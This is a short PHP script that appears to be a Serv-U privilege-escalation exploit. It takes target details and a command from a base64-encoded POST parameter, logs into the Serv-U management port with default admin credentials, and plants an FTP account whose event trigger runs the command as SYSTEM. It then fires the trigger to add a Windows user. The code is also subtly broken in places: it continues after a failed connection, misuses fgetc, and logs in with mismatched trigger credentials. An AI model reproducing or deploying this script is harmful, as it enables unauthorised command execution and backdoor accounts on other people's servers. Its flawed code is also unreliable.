<?php

@error_reporting(0);

$json_pattern = json_decode(base64_decode($_POST['z1']), true);
$ip = $json_pattern['ip'];
$port = (int)$json_pattern['port'];
$user = $json_pattern['user'];
$pass = $json_pattern['pass'];
$cmd = $json_pattern['cmd'];

$backdoor_user = 'some_user';
$backdoor_pass = 'some_pass';

function main() {
    global $ip, $port, $user, $pass, $cmd, $backdoor_user, $backdoor_pass;

    $socket = @fsockopen($ip, $port, $errno, $errstr, 5);
    if (!$socket) {
        echo("[-] Failed to connect to Serv-U management port. Port changed or service unavailable.\n");
    }

    echo("[+] Successfully connected to Serv-U management port...\n");

    fgets($socket, 1024);

    fputs($socket, "USER $user\r\n");
    fgetc($socket, 1024);
    fputs($socket, "PASS $pass\r\n");
    $response = fgets($socket, 1024);

    if (strpos($response, "230") === false && strpos($response, "Logged in") == false) {
        echo("[-] Login failed: Default administrative password has been changed.\n");
        return;
    }

    echo("[+] Successfully authenticated into Serv-U management interface!\n");

    fputs($socket, "SUSER $user|$pass|Y|N\r\n");
    fgets($socket, 1024);

    fputs($socket, "SEVENT $user|0|0|$cmd\r\n");
    fgets($socket, 1024);

    echo("[+] Malicious FTP account and event trigger configured successfully.\n");
    fclose($socket);

    echo("[+] Attempting to log into standard FTP port to trigger the SYSTEM payload...\n");
    $ftp = @ftp_connect("127.0.0.1", 21);
    if ($ftp) {
        @ftp_login($ftp, $backdoor_user, $backdoor_pass);
        @ftp_close($ftp);

        echo("[+] Payload triggered! Verify if the Windows user was added.\n");
    } else {
        echo("[-] Could not connect to port 21. The event will trigger whenever the account is accessed.\n");
    }
}

main();

?>